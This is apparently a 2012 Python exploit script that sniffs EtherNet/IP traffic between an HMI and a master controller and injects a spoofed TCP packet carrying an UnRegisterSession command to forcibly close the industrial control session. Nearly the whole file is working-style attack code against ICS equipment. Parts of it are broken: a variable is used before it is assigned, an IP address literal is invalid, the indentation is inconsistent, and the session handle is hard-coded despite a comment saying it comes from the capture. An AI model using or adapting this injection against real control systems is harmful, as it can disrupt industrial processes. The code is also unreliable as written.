#!/usr/bin/python
############################################################################                                                                              
# close session handle in EtherNet/IP traffic         
# By Wei Gao                                                                  
#                                                                             
#release date: Aug 27 2012                                                    
# This script is a demonstration of a closing session handle in EtherNet/IP traffic    
###########################################################################

from sys import argv
from os import geteuid
from scapy.all import *
import socket
import random
from struct import *

#check the program argument
if len(argv) !=4:
   print "[!] Usage: ./exploit.py <interface> <HMI> <Master>"
   sys.exit(0)


conf.verb = 0


payload = ''
tmp = ''
# Sniff a packet to from HMI host to Master
# port 44818 is for EhterNet/IP 
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)

while True:
  while s_addr != sys.argv[3]:
    packet = s.recvfrom(65565)
  
#packet string from tuple
    packet = packet[0]
  
  #take first 20 characters for the ip header
    ip_header = packet[0:20]
  
  #now unpack the ip shit
    iph = unpack('!BBHHHBBH4s4s' , ip_header)
  
    version_ihl = iph[0]
    version = version_ihl >> 4
    ihl = version_ihl & 0xF
  
    ttl = iph[5]
    protocol = iph[6]
    s_addr = socket.inet_ntoa(iph[8]);
    d_addr = socket.inet_ntoa(iph[9]);
  
    print 'Version : ' + str(version) + ' IP Header Length : ' + str(ihl) + ' TTL : ' + str(ttl) + ' Protocol : ' + str(protocol) + ' Source Address : ' + str(s_addr) + ' Destination Address : ' + str(d_addr)
  
    tcp_header = packet[20:40]
  
  #now unpack the tcp shit
    tcph = unpack('!HHLLBBHHH' , tcp_header)
  
    source_port = tcph[0]
    dest_port = tcph[1]
    sequence = tcph[2]
    acknowledgement = tcph[3]
    doff_reserved = tcph[4]
    tcph_length = doff_reserved >> 4
  
    print 'Source Port : ' + str(source_port) + ' Dest Port : ' + str(dest_port) + ' Sequence Number : ' + str(sequence) + ' Acknowledgement : ' + str(acknowledgement) + ' TCP header length : ' + str(tcph_length)
  
    h_size = ihl * 4 + tcph_length * 4
    data_size = len(packet) - h_size
  
  #get data from the packet
    data = packet[data_size:]
  

#make sure it is the fucking one we want

#craft payload to be fucking UnRegisterSession Command
#tmp = pkt[0].payload

#format is command + length + session handle + status + sender content + options
#unregistersession command is 66
#length is 0000
#session handle is the same from captures EIP packet
#status must be 00000000
#sender content 0000000000000000
#option must be 00000000
                             ################
  payload = '\x66\x00\x00\x00\x00\x05\x02\x0e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
#add 54 to the sequence number and send it with close session handle
sr1(IP(src = 10.200.150, dst = 10.200.3.225)/TCP(sport= 44818, dport = source_port, flags="PA", seq=sequence, ack=acknowledgement)/payload)

  #send(IP(src = "10.200.3.150", dst = "10.200.3.225")/TCP(sport= 44818, dport = 44818, flags="PA", seq = pkt[0].seq, ack = pkt[0].ack, window=pkt[0].window)/payload, iface = "eth0")
  print ">>> Close EtherNet/IP session!"




